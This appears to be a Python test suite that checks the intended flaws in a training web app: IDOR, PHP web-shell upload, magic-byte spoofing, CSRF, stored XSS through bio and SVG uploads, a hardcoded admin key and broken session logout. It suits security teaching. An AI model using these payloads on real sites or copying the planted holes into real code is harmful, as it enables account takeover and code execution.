"""
SecureHub VAPT Training Lab — Automated Verification Suite for Phase 4 Vulnerabilities (18–26)
Tests:
  - VULN-18: Insecure Direct Object References (IDOR) on Profile Update
  - VULN-19: Arbitrary File Upload via Unrestricted Extension Validation
  - VULN-20: Current Password Verification Bypass on Sensitive Updates
  - VULN-21: Cross-Site Request Forgery (CSRF) on Sensitive Actions
  - VULN-22: Stored Cross-Site Scripting (XSS) in Bio & Profile Fields
  - VULN-23: MIME-Type & Magic Byte Validation Spoofing
  - VULN-24: Stored Cross-Site Scripting (XSS) via Malicious SVG Upload
  - VULN-25: Hardcoded API Key & Insecure PAT Storage
  - VULN-26: Active Session Termination & Remote Logout Enforcement
"""

import os
import io
import sqlite3
import unittest
import json
from app import app, DATABASE_PATH, UPLOAD_FOLDER
from reset_lab import reset_environment


class Phase4VulnerabilityVerificationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        print("\n" + "=" * 70)
        print(" VERIFYING PHASE 4 VULNERABILITIES (18–26)")
        print("=" * 70)

    def setUp(self):
        reset_environment()
        app.config["TESTING"] = True
        app.config["WTF_CSRF_ENABLED"] = False
        self.client = app.test_client()

    def get_db(self):
        conn = sqlite3.connect(DATABASE_PATH)
        conn.row_factory = sqlite3.Row
        return conn

    def login_user(self, client, username="bob", password="bob123"):
        return client.post("/login", data={"username": username, "password": password}, follow_redirects=True)

    # -------------------------------------------------------------------------
    # VULN-18: Insecure Direct Object References (IDOR) on Profile Update
    # -------------------------------------------------------------------------
    def test_18_idor_profile_update(self):
        print("\n[*] Testing VULN-18: Insecure Direct Object References (IDOR) on Profile Update...")
        # Authenticate as Bob (ID: 2)
        login_resp = self.login_user(self.client, "bob", "bob123")
        self.assertEqual(login_resp.status_code, 200)

        # Bob submits profile update targeting Alice (ID: 1)
        idor_payload = {
            "user_id": "1",  # Target: Alice
            "display_name": "Alice Hijacked via IDOR",
            "phone": "+1 (555) 999-IDOR",
            "address": "1337 Attacker Lane",
            "bio": "Compromised by IDOR vulnerability in profile update workflow."
        }
        resp = self.client.post("/profile/edit", data=idor_payload, follow_redirects=True)
        self.assertEqual(resp.status_code, 200)

        # Verify Alice's record in database was modified by Bob's request
        db = self.get_db()
        alice = db.execute("SELECT * FROM users WHERE id = 1").fetchone()
        db.close()

        self.assertEqual(alice["display_name"], "Alice Hijacked via IDOR")
        self.assertEqual(alice["phone"], "+1 (555) 999-IDOR")
        self.assertEqual(alice["address"], "1337 Attacker Lane")
        print("    [PASS] VULN-18 Verified: Bob (user 2) modified Alice's (user 1) profile via user_id parameter.")

    # -------------------------------------------------------------------------
    # VULN-19: Arbitrary File Upload via Unrestricted Extension Validation
    # -------------------------------------------------------------------------
    def test_19_arbitrary_file_upload_extension(self):
        print("\n[*] Testing VULN-19: Arbitrary File Upload via Unrestricted Extension Validation...")
        self.login_user(self.client, "bob", "bob123")

        # 1. Verify blocked executable .exe is rejected
        exe_file = (io.BytesIO(b"MZ\x90\x00Binary"), "payload.exe")
        resp_exe = self.client.post("/upload", data={"file": exe_file}, follow_redirects=True)
        self.assertIn(b"prohibited", resp_exe.data.lower())

        # 2. Upload arbitrary web script (.php)
        php_content = b"<?php phpinfo(); // SecureHub Training Payload ?>"
        php_file = (io.BytesIO(php_content), "webshell.php")
        resp_php = self.client.post("/upload", data={"file": php_file, "description": "Test Web Shell"}, follow_redirects=True)
        self.assertEqual(resp_php.status_code, 200)

        # Verify in database
        db = self.get_db()
        file_rec = db.execute("SELECT * FROM files WHERE original_filename = 'webshell.php'").fetchone()
        db.close()

        self.assertIsNotNone(file_rec)
        self.assertTrue(file_rec["stored_filename"].endswith("webshell.php"))

        # Verify file exists on disk with .php extension preserved
        disk_path = os.path.join(UPLOAD_FOLDER, file_rec["stored_filename"])
        self.assertTrue(os.path.exists(disk_path))
        with open(disk_path, "rb") as f:
            self.assertEqual(f.read(), php_content)

        print(f"    [PASS] VULN-19 Verified: webshell.php uploaded and stored on disk: {file_rec['stored_filename']}")

    # -------------------------------------------------------------------------
    # VULN-20: Current Password Verification Bypass on Sensitive Updates
    # -------------------------------------------------------------------------
    def test_20_current_password_verification_bypass(self):
        print("\n[*] Testing VULN-20: Current Password Verification Bypass on Sensitive Updates...")
        self.login_user(self.client, "bob", "bob123")

        # Bob submits password update with completely false current_password
        bypass_data = {
            "current_password": "WRONG_INCORRECT_PASSWORD_123",
            "new_password": "bob_new_secret_pwd_456",
            "confirm_password": "bob_new_secret_pwd_456"
        }
        resp = self.client.post("/settings/security", data=bypass_data, follow_redirects=True)
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"Account password updated successfully", resp.data)

        # Verify password changed in DB
        db = self.get_db()
        bob = db.execute("SELECT password FROM users WHERE username = 'bob'").fetchone()
        db.close()

        self.assertEqual(bob["password"], "bob_new_secret_pwd_456")

        # Verify login succeeds with the new password
        new_client = app.test_client()
        login_resp = self.login_user(new_client, "bob", "bob_new_secret_pwd_456")
        self.assertEqual(login_resp.status_code, 200)
        self.assertIn(b"Welcome back", login_resp.data)

        print("    [PASS] VULN-20 Verified: Password updated despite invalid current password.")

    # -------------------------------------------------------------------------
    # VULN-21: Cross-Site Request Forgery (CSRF) on Sensitive Actions
    # -------------------------------------------------------------------------
    def test_21_csrf_sensitive_action(self):
        print("\n[*] Testing VULN-21: Cross-Site Request Forgery (CSRF) on Sensitive Actions...")
        self.login_user(self.client, "bob", "bob123")

        # Simulate forged external POST request with cross-origin headers and no CSRF token
        forged_email = "bob_hijacked_by_csrf@evil-domain.local"
        headers = {
            "Origin": "http://evil-attacker-site.com",
            "Referer": "http://evil-attacker-site.com/exploit.html"
        }
        resp = self.client.post("/settings/email", data={"email": forged_email}, headers=headers, follow_redirects=True)
        self.assertEqual(resp.status_code, 200)

        # Verify email updated in database
        db = self.get_db()
        bob = db.execute("SELECT email FROM users WHERE username = 'bob'").fetchone()
        db.close()

        self.assertEqual(bob["email"], forged_email)
        print("    [PASS] VULN-21 Verified: Email updated via unauthenticated cross-site POST without CSRF token.")

    # -------------------------------------------------------------------------
    # VULN-22: Stored Cross-Site Scripting (XSS) in Bio & Profile Fields
    # -------------------------------------------------------------------------
    def test_22_stored_xss_bio(self):
        print("\n[*] Testing VULN-22: Stored Cross-Site Scripting (XSS) in Bio & Profile Fields...")
        self.login_user(self.client, "bob", "bob123")

        xss_payload = '<script id="probe_xss">alert("STORED_XSS_BIO_VULN22")</script><img src="x" onerror="console.log(1)">'
        self.client.post("/profile/edit", data={
            "user_id": "2",
            "display_name": "Bob Brown",
            "phone": "+1 555-0101",
            "address": "Texas",
            "bio": xss_payload
        }, follow_redirects=True)

        # 1. Check /profile
        profile_resp = self.client.get("/profile")
        self.assertEqual(profile_resp.status_code, 200)
        self.assertIn(xss_payload.encode(), profile_resp.data)

        # 2. Check public directory detail /user/2
        user_resp = self.client.get("/user/2")
        self.assertEqual(user_resp.status_code, 200)
        self.assertIn(xss_payload.encode(), user_resp.data)

        print("    [PASS] VULN-22 Verified: Raw script payload rendered unescaped (| safe) in /profile and /user/2.")

    # -------------------------------------------------------------------------
    # VULN-23: MIME-Type & Magic Byte Validation Spoofing
    # -------------------------------------------------------------------------
    def test_23_mime_magic_spoofing(self):
        print("\n[*] Testing VULN-23: MIME-Type & Magic Byte Validation Spoofing...")
        self.login_user(self.client, "bob", "bob123")

        # Craft executable script disguised with GIF89a header and image/gif content type
        disguised_script = b"GIF89a<?php echo 'Disguised_Shell_Executed'; ?>"
        avatar_file = (io.BytesIO(disguised_script), "avatar_shell.php")

        resp = self.client.post(
            "/profile/avatar",
            data={"avatar": (io.BytesIO(disguised_script), "avatar_shell.php", "image/gif")},
            content_type="multipart/form-data",
            follow_redirects=True
        )
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"avatar updated successfully", resp.data.lower())

        # Check DB to verify avatar filename
        db = self.get_db()
        bob = db.execute("SELECT avatar FROM users WHERE username = 'bob'").fetchone()
        db.close()

        self.assertIn("avatar_shell.php", bob["avatar"])
        avatar_path = os.path.join(UPLOAD_FOLDER, bob["avatar"])
        self.assertTrue(os.path.exists(avatar_path))

        with open(avatar_path, "rb") as f:
            self.assertEqual(f.read(), disguised_script)

        print(f"    [PASS] VULN-23 Verified: Script disguised via GIF89a/image MIME accepted: {bob['avatar']}")

    # -------------------------------------------------------------------------
    # VULN-24: Stored Cross-Site Scripting (XSS) via Malicious SVG Upload
    # -------------------------------------------------------------------------
    def test_24_stored_xss_svg_upload(self):
        print("\n[*] Testing VULN-24: Stored Cross-Site Scripting (XSS) via Malicious SVG Upload...")
        self.login_user(self.client, "bob", "bob123")

        malicious_svg = b"""<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
  <circle cx="50" cy="50" r="40" fill="red" />
  <script type="text/javascript">
    alert('SVG_STORED_XSS_DEMO_2026');
  </script>
</svg>"""
        svg_file = (io.BytesIO(malicious_svg), "vector_exploit.svg")
        upload_resp = self.client.post("/upload", data={"file": svg_file}, follow_redirects=True)
        self.assertEqual(upload_resp.status_code, 200)

        # Access /uploads gallery to trigger inline rendering
        gallery_resp = self.client.get("/uploads")
        self.assertEqual(gallery_resp.status_code, 200)

        # Verify raw script is present inline in HTML
        self.assertIn(b"alert('SVG_STORED_XSS_DEMO_2026')", gallery_resp.data)
        self.assertIn(b'<script type="text/javascript">', gallery_resp.data)

        print("    [PASS] VULN-24 Verified: Uploaded SVG embedded raw into HTML gallery, executing inline scripts.")

    # -------------------------------------------------------------------------
    # VULN-25: Hardcoded API Key & Insecure PAT Storage
    # -------------------------------------------------------------------------
    def test_25_hardcoded_api_key_and_plaintext_pat(self):
        print("\n[*] Testing VULN-25: Hardcoded API Key & Insecure PAT Storage...")

        # 1. Verify hardcoded developer API key authorizes access
        resp_dev = self.client.get("/api/v1/system/status", headers={"X-API-Key": "SECUREHUB_DEV_INTEGRATION_KEY_TEST_LAB_987654321"})
        self.assertEqual(resp_dev.status_code, 200)
        data_dev = json.loads(resp_dev.data)
        self.assertEqual(data_dev["authenticated_via"], "internal_dev_key")
        self.assertEqual(data_dev["identity"]["role"], "system_admin")

        # 2. Login as Bob and generate a Personal Access Token
        self.login_user(self.client, "bob", "bob123")
        gen_resp = self.client.post("/settings/api", data={"action": "generate", "token_name": "Automated Pipeline Token"}, follow_redirects=True)
        self.assertEqual(gen_resp.status_code, 200)

        # 3. Verify plaintext storage in database
        db = self.get_db()
        pat_rows = db.execute("SELECT * FROM personal_access_tokens WHERE user_id = 2 ORDER BY id DESC").fetchall()
        db.close()

        latest_pat = pat_rows[0]
        token_val = latest_pat["token_value"]
        self.assertTrue(token_val.startswith("sh_pat_bob_"))
        # Verify plaintext token is rendered in settings page
        api_page = self.client.get("/settings/api")
        self.assertIn(token_val.encode(), api_page.data)

        # 4. Authenticate to REST API using Bearer PAT
        resp_pat = self.client.get("/api/v1/system/status", headers={"Authorization": f"Bearer {token_val}"})
        self.assertEqual(resp_pat.status_code, 200)
        data_pat = json.loads(resp_pat.data)
        self.assertEqual(data_pat["authenticated_via"], "personal_access_token")
        self.assertEqual(data_pat["identity"]["username"], "bob")

        print("    [PASS] VULN-25 Verified: Hardcoded API key active & PATs stored in plaintext without hashing.")

    # -------------------------------------------------------------------------
    # VULN-26: Active Session Termination & Remote Logout Enforcement
    # -------------------------------------------------------------------------
    def test_26_active_session_termination_bypass(self):
        print("\n[*] Testing VULN-26: Active Session Termination & Remote Logout Enforcement...")

        # Setup Client A (e.g. desktop session)
        client_a = app.test_client()
        self.login_user(client_a, "bob", "bob123")
        dash_a = client_a.get("/dashboard")
        self.assertEqual(dash_a.status_code, 200)

        # Setup Client B (e.g. mobile/remote session)
        client_b = app.test_client()
        self.login_user(client_b, "bob", "bob123")
        dash_b = client_b.get("/dashboard")
        self.assertEqual(dash_b.status_code, 200)

        # On Client A, view sessions and find Bob's sessions in DB
        db = self.get_db()
        active_b_sessions = db.execute("SELECT * FROM active_sessions WHERE user_id = 2 AND is_active = 1").fetchall()
        self.assertGreaterEqual(len(active_b_sessions), 1)
        target_session = active_b_sessions[-1]
        target_id = target_session["id"]
        db.close()

        # On Client A, invoke terminate endpoint for target session
        term_resp = client_a.post("/settings/sessions/terminate", data={"session_id": target_id}, follow_redirects=True)
        self.assertEqual(term_resp.status_code, 200)

        # Verify DB marks target session as inactive
        db = self.get_db()
        updated_session = db.execute("SELECT * FROM active_sessions WHERE id = ?", (target_id,)).fetchone()
        db.close()
        self.assertEqual(updated_session["is_active"], 0)

        # Vulnerability check: Client B (the "terminated" remote session) continues to make requests
        # Because the server failed to invalidate Client B's session cookie or enforce session tokens,
        # Client B STILL has full access to protected dashboard and profile routes!
        dash_b_after = client_b.get("/dashboard")
        self.assertEqual(dash_b_after.status_code, 200)
        self.assertIn(b"Bob Brown", dash_b_after.data)

        profile_b_after = client_b.get("/profile")
        self.assertEqual(profile_b_after.status_code, 200)
        self.assertIn(b"bob@training.local", profile_b_after.data)

        print("    [PASS] VULN-26 Verified: Remote session termination marked UI inactive but failed to invalidate session cookie.")


if __name__ == "__main__":
    unittest.main()
